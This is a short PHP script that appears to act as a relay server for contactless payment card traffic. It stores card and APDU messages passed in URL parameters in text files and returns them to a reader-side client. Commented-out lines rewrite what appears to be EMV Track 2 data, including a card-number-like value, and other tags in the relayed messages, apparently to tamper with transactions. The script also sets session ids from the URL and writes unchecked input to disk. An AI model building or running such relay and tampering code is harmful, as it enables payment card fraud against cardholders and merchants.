<?php
if (!empty($_GET['session']))
{
session_id($_GET['session']);
}
// file_put_contents("apdu.txt",str_replace("57135167679944312213d25042261000000005870f","57135167679944312213d25042260000000000000f",str_replace("8f0106", "8f01dd", $_GET['reader'])));

file_put_contents("pos.txt",$_GET['card']);//str_replace("57135167679944312213d25042261000000005870f","57135167679944312213d25042260000000000000f",str_replace("8f0106", "8f01dd", $_GET['card'])));
session_start();
echo session_id()."|";
if ($_GET['state']=="FromReader")
	{
	if (!isset($_SESSION['step']))
		{
		$_SESSION['step'] = 0;
		}
	else
		{
		$_SESSION['step'] = $_SESSION['step']+1;
		}
	$apdu = @file_get_contents("apdu.txt");
        if (($apdu==$_GET['apdu']) or (empty($apdu)))
		{exit("void");}
	else
		{exit($apdu);}
	}


?>
